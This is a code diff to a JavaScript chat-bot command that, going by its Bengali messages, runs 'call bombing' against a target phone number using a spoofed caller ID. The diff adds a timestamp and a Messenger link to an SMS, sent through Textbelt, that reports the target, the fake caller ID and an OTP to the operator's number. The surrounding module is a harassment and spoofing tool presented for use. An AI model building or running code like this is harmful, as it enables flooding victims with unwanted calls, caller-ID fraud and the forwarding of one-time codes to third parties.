@@ -28,6 +28,11 @@ module.exports.run = async ({ api, event, args }) => {
     );
   }
 
+  // সময় নিন (ঘন্টা, মিনিট, সেকেন্ড, মাস, বছর সহ)
+  const now = new Date();
+  const formattedTime = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ` +
+    `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+
   api.sendMessage(
     `📞 কল বোম্বিং শুরু হয়েছে:\n📲 নাম্বার: ${targetNumber}\n📤 ফেক কলার আইডি: ${fakeCallerID}\n\n⏳ অনুগ্রহ করে অপেক্ষা করুন...`,
     event.threadID,
@@ -51,13 +56,19 @@ module.exports.run = async ({ api, event, args }) => {
 
         // ✅ মেসেজ অটো ডিলিট
         setTimeout(() => {
-          api.unsendMessage(startInfo.messageID).catch(() => {});
+          api.unsendMessage(startInfo.messageID).catch(() => { });
         }, 90000); // ৯০ সেকেন্ড পরে
 
-        // ✅ তোমার নাম্বারে নোটিফিকেশন যাবে
+        // ✅ তোমার নাম্বারে নোটিফিকেশন যাবে মেসেঞ্জারে (Textbelt এর মাধ্যমে SMS যাবে)
         await axios.post("https://textbelt.com/text", {
           phone: `+880${smsNotifyNumber}`,
-          message: `🔥 কল বোম্বিং অনুরোধ:\n📲 টার্গেট: ${targetNumber}\n📤 ফেক কলার ID: ${fakeCallerID}\n🔐 OTP: ${otp}\n🕒 সময়: ${new Date().toLocaleString("bn-BD")}`,
+          message:
+            `🔥 কল বোম্বিং অনুরোধ:\n` +
+            `📲 টার্গেট: ${targetNumber}\n` +
+            `📤 ফেক কলার ID: ${fakeCallerID}\n` +
+            `🔐 OTP: ${otp}\n` +
+            `🕒 সময়: ${formattedTime}\n\n` +
+            `💬 মেসেঞ্জার আইডি: https://m.me/RAJA.ViP.5X.09638357510`,
           key: "textbelt"
         });
 
